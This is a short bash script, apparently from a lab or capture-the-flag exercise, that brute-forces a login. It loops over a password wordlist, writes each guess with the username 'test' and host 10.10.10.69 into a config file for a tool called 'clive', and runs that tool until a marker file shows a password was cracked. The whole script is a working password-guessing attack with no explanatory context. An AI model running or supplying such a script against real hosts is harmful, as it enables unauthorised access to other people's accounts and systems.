#!/bin/bash
#

export USERNAME=test
export HOST=10.10.10.69

file_path="password_list.txt"

# Check if the file exists
if [ -f "$file_path" ]; then
  # Read each line of the file
  while IFS= read -r password; do
    # check if hunted.txt exists
    # which will mean password is cracked!
    if [ -f "hunted.txt" ]; then
      echo "PASSWORD FOUND!"
      exit 0
    fi
    echo "attempting password: $password"
    export PASSWORD=$password
    cat clive-sample.yml > clive.yml
    sed -i 's/${HOST}/'$HOST'/' clive.yml
    sed -i 's/${USERNAME}/'$USERNAME'/' clive.yml
    sed -i 's/${PASSWORD}/'$PASSWORD'/' clive.yml
    clive start
  done < "$file_path"
else
  echo "Passwords file not found."
fi
